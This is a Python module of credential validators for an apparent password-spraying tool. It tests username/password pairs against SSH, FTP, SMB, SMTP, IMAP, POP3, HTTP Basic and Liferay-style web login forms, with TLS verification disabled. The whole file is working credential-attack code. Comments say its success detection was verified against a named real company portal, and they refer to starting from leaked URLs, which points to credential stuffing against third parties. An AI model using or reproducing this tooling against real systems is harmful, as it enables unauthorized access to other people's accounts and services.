"""Per-protocol credential validators.

Each validator returns a tuple (success, detail) where success is a bool and
detail is a short human-readable string. Validators must NEVER raise on
authentication failure — they only raise on unexpected errors.

Optional dependencies (paramiko for SSH, smbprotocol for SMB) are imported
lazily so the executor can run even when they are not installed; missing
dependencies cause the corresponding protocol to be reported as unsupported.
"""

from __future__ import annotations

import ftplib
import imaplib
import os
import poplib
import re
import smtplib
import socket
import ssl
from html.parser import HTMLParser
from typing import Tuple, Optional, Dict, List
from urllib.parse import urljoin

import requests
from requests.auth import HTTPBasicAuth

# Pentest targets routinely use self-signed/expired certs and we validate
# with verify=False on purpose — silence the per-request InsecureRequestWarning
# so it doesn't flood the dispatcher logs.
try:
    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
except Exception:
    pass


ValidationResult = Tuple[bool, str]


def _short(detail: object, limit: int = 200) -> str:
    s = str(detail)
    return s if len(s) <= limit else s[:limit] + "..."


# Cookie names that indicate an AUTHENTICATED session (strongest success
# signal). Liferay issues COMPANY_ID / ID / USER_UUID / SCREEN_NAME only
# after a successful login; guest/failed sessions never receive them.
# Verified against canales.movistar.com.ar: valid login gained
# {company_id, id, user_uuid}; bogus login gained none of these.
_AUTH_COOKIE_MARKERS = {
    "company_id", "user_uuid", "screen_name", "id", "password", "login",
    "remember_me",
}


# Default substrings that indicate a FAILED form login. Covers Liferay's
# Spanish/English auth-error messages and generic patterns. Tune via
# BAGRE_PASSWORD_SPRAY_HTTP_FAIL_REGEX (a regex, case-insensitive).
_DEFAULT_HTTP_FAIL_MARKERS = [
    r"portlet-msg-error",
    r"authentication\s+failed",
    r"please\s+enter\s+a\s+valid",
    r"the\s+(?:username|email|login)\s+and\s+password",
    r"combinaci[oó]n\s+de.*no\s+(?:son|es)\s+v[aá]lid",   # "la combinación ... no son válidos"
    r"usuario\s+o\s+contrase[nñ]a.*incorrect",
    r"autenticaci[oó]n\s+(?:fall|err)",
    r"credenciales?\s+(?:inv[aá]lid|incorrect)",
    r"login\s+(?:invalid|incorrect|failed)",
    r"contrase[nñ]a\s+incorrect",
]


class _LoginFormParser(HTMLParser):
    """Extract the login <form>: its action, method, hidden inputs, and the
    username/password field names. Picks the first form that contains a
    password input."""

    def __init__(self):
        super().__init__()
        self._forms: List[Dict] = []
        self._cur: Optional[Dict] = None

    def handle_starttag(self, tag, attrs):
        a = {k.lower(): (v or "") for k, v in attrs}
        if tag == "form":
            self._cur = {
                "action": a.get("action", ""),
                "method": (a.get("method", "get") or "get").lower(),
                "inputs": [],
            }
        elif tag == "input" and self._cur is not None:
            self._cur["inputs"].append({
                "name": a.get("name", ""),
                "type": (a.get("type", "text") or "text").lower(),
                "value": a.get("value", ""),
            })

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self._forms.append(self._cur)
            self._cur = None

    def login_form(self) -> Optional[Dict]:
        # Prefer a form that has a password field.
        for f in self._forms:
            if any(i["type"] == "password" for i in f["inputs"]):
                return f
        return None


def _http_fail_regex() -> "re.Pattern":
    custom = os.environ.get("BAGRE_PASSWORD_SPRAY_HTTP_FAIL_REGEX")
    markers = [custom] if custom else _DEFAULT_HTTP_FAIL_MARKERS
    return re.compile("|".join(markers), re.IGNORECASE)


def validate_http_form(
    url: str,
    username: str,
    password: str,
    timeout: float = 10.0,
) -> ValidationResult:
    """Attempt a POST form login (e.g. Liferay portals).

    Flow:
      1. GET the url to obtain the login form + cookies + any per-session
         CSRF/auth token (Liferay's p_auth, _58_formDate, etc.).
      2. Auto-detect the form's username/password field names and replay all
         hidden inputs (so tokens are preserved).
      3. POST the credentials.
      4. Classify: a FAILED login is detected by a configurable failure-marker
         regex in the response body OR a redirect back to the same login form.
         Anything else with a 2xx/redirect that is NOT a failure is treated as
         a likely success.

    Detection is heuristic. The failure markers default to common Liferay /
    Spanish / English auth-error strings; override with
    BAGRE_PASSWORD_SPRAY_HTTP_FAIL_REGEX after observing a real failed login.
    """
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (bagre-spray)"})

    # Try the exact endpoint first; if it has no login form, fall back to the
    # host root and a couple of common login paths (the leaked URL is often a
    # deep page that doesn't render the login portlet, while the home page
    # does). Stops at the first page that contains a password field.
    from urllib.parse import urlparse as _urlparse
    pu = _urlparse(url)
    root = f"{pu.scheme}://{pu.netloc}"
    candidate_urls = [url, root + "/", root + "/web/guest/home", root + "/c/portal/login"]
    seen_urls = set()

    getr = None
    form = None
    for cand in candidate_urls:
        if cand in seen_urls:
            continue
        seen_urls.add(cand)
        try:
            getr = session.get(cand, timeout=timeout, verify=False, allow_redirects=True)
        except requests.exceptions.RequestException:
            continue
        parser = _LoginFormParser()
        try:
            parser.feed(getr.text)
        except Exception:
            pass
        form = parser.login_form()
        if form:
            break

    if not form or getr is None:
        return False, "http-form: no login form (password field) found on endpoint or host root"

    # Identify username + password field names.
    pass_field = next((i["name"] for i in form["inputs"] if i["type"] == "password" and i["name"]), "")
    user_field = ""
    for i in form["inputs"]:
        if i["type"] in ("text", "email") and i["name"]:
            user_field = i["name"]
            break
    if not pass_field or not user_field:
        return False, f"http-form: could not identify user/pass fields (user={user_field!r} pass={pass_field!r})"

    # Build POST payload: replay every hidden/non-credential input, then set
    # the credentials.
    payload: Dict[str, str] = {}
    for i in form["inputs"]:
        if i["name"] and i["name"] not in (user_field, pass_field):
            payload[i["name"]] = i["value"]
    payload[user_field] = username
    payload[pass_field] = password

    action = form["action"] or url
    post_url = urljoin(getr.url, action)

    # Snapshot cookies before login so we can detect authenticated-session
    # cookies acquired by a successful POST (the strongest success signal).
    pre_cookies = {c.lower() for c in session.cookies.keys()}

    try:
        postr = session.post(
            post_url, data=payload, timeout=timeout, verify=False, allow_redirects=True
        )
    except requests.exceptions.RequestException as e:
        return False, f"http-form POST error: {_short(e)}"

    body = postr.text or ""
    fail_re = _http_fail_regex()
    failure_matched = bool(fail_re.search(body))

    # Primary success signal: the login acquired authenticated-session
    # cookies. Liferay sets COMPANY_ID / ID / USER_UUID / SCREEN_NAME only
    # after a successful auth; a failed/guest session never gets these.
    gained = {c.lower() for c in session.cookies.keys()} - pre_cookies
    auth_gained = sorted(c for c in gained if c in _AUTH_COOKIE_MARKERS)

    if auth_gained and not failure_matched:
        return True, (
            f"http-form: authenticated — acquired session cookies "
            f"{auth_gained} as {username!r} (HTTP {postr.status_code})"
        )

    if failure_matched:
        return False, f"http-form: failure marker matched (user={username!r}, field={user_field})"

    # No auth cookies and no failure marker: inconclusive. Report as failure
    # (we do NOT want false positives) but flag it for manual review.
    return False, (
        f"http-form: inconclusive — no auth-session cookies and no failure "
        f"marker (HTTP {postr.status_code}, field={user_field}); VERIFY MANUALLY"
    )


def validate_ssh(host: str, port: int, username: str, password: str, timeout: float = 5.0) -> ValidationResult:
    """Attempt SSH password authentication."""
    try:
        import paramiko
    except ImportError:
        return False, "ssh validator unavailable: paramiko not installed"

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host,
            port=port or 22,
            username=username,
            password=password,
            timeout=timeout,
            auth_timeout=timeout,
            banner_timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
        )
        return True, "ssh authentication succeeded"
    except paramiko.AuthenticationException:
        return False, "ssh authentication failed"
    except (socket.timeout, socket.error, paramiko.SSHException) as e:
        return False, f"ssh connection error: {_short(e)}"
    except Exception as e:
        return False, f"ssh error: {_short(e)}"
    finally:
        try:
            client.close()
        except Exception:
            pass


def validate_http_basic(
    host: str,
    port: int,
    username: str,
    password: str,
    scheme: str = "http",
    timeout: float = 5.0,
    path: str = "/",
) -> ValidationResult:
    """Attempt HTTP Basic authentication.

    A 200/2xx response indicates valid credentials. A 401 indicates the auth
    challenge was presented but credentials rejected. Anything else is treated
    as inconclusive (returned as failure with detail).
    """
    if port and port not in (80, 443):
        url = f"{scheme}://{host}:{port}{path}"
    else:
        url = f"{scheme}://{host}{path}"

    try:
        response = requests.get(
            url,
            auth=HTTPBasicAuth(username, password),
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
    except requests.exceptions.RequestException as e:
        return False, f"http connection error: {_short(e)}"

    if 200 <= response.status_code < 300:
        if "WWW-Authenticate" in response.headers:
            return False, f"http {response.status_code} but server still presenting auth challenge"
        return True, f"http {response.status_code} on {url}"
    if response.status_code == 401:
        return False, "http 401 unauthorized"
    if response.status_code == 403:
        return False, "http 403 forbidden"
    return False, f"http {response.status_code} (inconclusive)"


def validate_ftp(host: str, port: int, username: str, password: str, timeout: float = 5.0) -> ValidationResult:
    """Attempt FTP login."""
    ftp = ftplib.FTP()
    try:
        ftp.connect(host=host, port=port or 21, timeout=timeout)
        ftp.login(user=username, passwd=password)
        return True, "ftp login succeeded"
    except ftplib.error_perm as e:
        return False, f"ftp permission error: {_short(e)}"
    except (socket.timeout, socket.error, ftplib.all_errors) as e:
        return False, f"ftp connection error: {_short(e)}"
    except Exception as e:
        return False, f"ftp error: {_short(e)}"
    finally:
        try:
            ftp.quit()
        except Exception:
            try:
                ftp.close()
            except Exception:
                pass


def validate_smb(host: str, port: int, username: str, password: str, timeout: float = 5.0) -> ValidationResult:
    """Attempt SMB login using smbprotocol.

    Splits DOMAIN\\user if present; otherwise uses workgroup.
    """
    try:
        from smbprotocol.connection import Connection
        from smbprotocol.session import Session
        from smbprotocol.exceptions import SMBAuthenticationError, SMBException
    except ImportError:
        return False, "smb validator unavailable: smbprotocol not installed"

    domain = ""
    user = username
    if "\\" in username:
        domain, user = username.split("\\", 1)

    import uuid
    conn = Connection(uuid.uuid4(), host, port or 445)
    try:
        conn.connect(timeout=int(timeout))
        session = Session(conn, user, password, require_encryption=False)
        session.connect()
        return True, "smb session established"
    except SMBAuthenticationError as e:
        return False, f"smb authentication failed: {_short(e)}"
    except SMBException as e:
        return False, f"smb error: {_short(e)}"
    except (socket.timeout, socket.error) as e:
        return False, f"smb connection error: {_short(e)}"
    except Exception as e:
        return False, f"smb error: {_short(e)}"
    finally:
        try:
            conn.disconnect(close=True)
        except Exception:
            pass


def validate_smtp(
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: float = 5.0,
    use_ssl: Optional[bool] = None,
) -> ValidationResult:
    """Attempt SMTP AUTH login.

    Picks SSL automatically for port 465; tries STARTTLS otherwise.
    """
    actual_port = port or 25
    smtp_ssl = use_ssl if use_ssl is not None else actual_port == 465

    try:
        if smtp_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            client = smtplib.SMTP_SSL(host=host, port=actual_port, timeout=timeout, context=ctx)
        else:
            client = smtplib.SMTP(host=host, port=actual_port, timeout=timeout)
            client.ehlo()
            if client.has_extn("starttls"):
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                client.starttls(context=ctx)
                client.ehlo()
        try:
            client.login(username, password)
            return True, "smtp authentication succeeded"
        except smtplib.SMTPAuthenticationError as e:
            return False, f"smtp authentication failed: {_short(e)}"
        finally:
            try:
                client.quit()
            except Exception:
                pass
    except (socket.timeout, socket.error, smtplib.SMTPException) as e:
        return False, f"smtp connection error: {_short(e)}"
    except Exception as e:
        return False, f"smtp error: {_short(e)}"


def validate_imap(
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: float = 5.0,
    use_ssl: Optional[bool] = None,
) -> ValidationResult:
    """Attempt IMAP login. Uses SSL on 993 by default."""
    actual_port = port or 143
    imap_ssl = use_ssl if use_ssl is not None else actual_port == 993

    try:
        socket.setdefaulttimeout(timeout)
        if imap_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            client = imaplib.IMAP4_SSL(host=host, port=actual_port, ssl_context=ctx)
        else:
            client = imaplib.IMAP4(host=host, port=actual_port)
        try:
            client.login(username, password)
            try:
                client.logout()
            except Exception:
                pass
            return True, "imap authentication succeeded"
        except imaplib.IMAP4.error as e:
            return False, f"imap authentication failed: {_short(e)}"
    except (socket.timeout, socket.error) as e:
        return False, f"imap connection error: {_short(e)}"
    except Exception as e:
        return False, f"imap error: {_short(e)}"
    finally:
        socket.setdefaulttimeout(None)


def validate_pop3(
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: float = 5.0,
    use_ssl: Optional[bool] = None,
) -> ValidationResult:
    """Attempt POP3 login. Uses SSL on 995 by default."""
    actual_port = port or 110
    pop_ssl = use_ssl if use_ssl is not None else actual_port == 995

    try:
        if pop_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            client = poplib.POP3_SSL(host=host, port=actual_port, timeout=timeout, context=ctx)
        else:
            client = poplib.POP3(host=host, port=actual_port, timeout=timeout)
        try:
            client.user(username)
            client.pass_(password)
            try:
                client.quit()
            except Exception:
                pass
            return True, "pop3 authentication succeeded"
        except poplib.error_proto as e:
            return False, f"pop3 authentication failed: {_short(e)}"
    except (socket.timeout, socket.error) as e:
        return False, f"pop3 connection error: {_short(e)}"
    except Exception as e:
        return False, f"pop3 error: {_short(e)}"


VALIDATORS = {
    "ssh": validate_ssh,
    "ftp": validate_ftp,
    "smb": validate_smb,
    "smtp": validate_smtp,
    "imap": validate_imap,
    "pop3": validate_pop3,
}


def validate(
    protocol: str,
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: float = 5.0,
    url: Optional[str] = None,
) -> ValidationResult:
    """Dispatch to the right validator for the given normalized protocol.

    `url` is the full credential endpoint (scheme://host[:port]/path?query).
    It is required for the form-login validators (http-form / https-form),
    which must GET the actual login page; it is ignored by the others.
    """
    proto = (protocol or "").lower()
    if proto in ("http-form", "https-form"):
        if not url:
            scheme = "https" if proto == "https-form" else "http"
            url = f"{scheme}://{host}" + (f":{port}" if port and port not in (80, 443) else "")
        return validate_http_form(url=url, username=username, password=password, timeout=max(timeout, 10.0))
    if proto in ("http", "https"):
        return validate_http_basic(
            host=host,
            port=port,
            username=username,
            password=password,
            scheme=proto,
            timeout=timeout,
        )
    fn = VALIDATORS.get(proto)
    if not fn:
        return False, f"protocol '{protocol}' not supported"
    return fn(host=host, port=port, username=username, password=password, timeout=timeout)


SUPPORTED_PROTOCOLS = sorted({"http", "https", "http-form", "https-form"} | set(VALIDATORS.keys()))
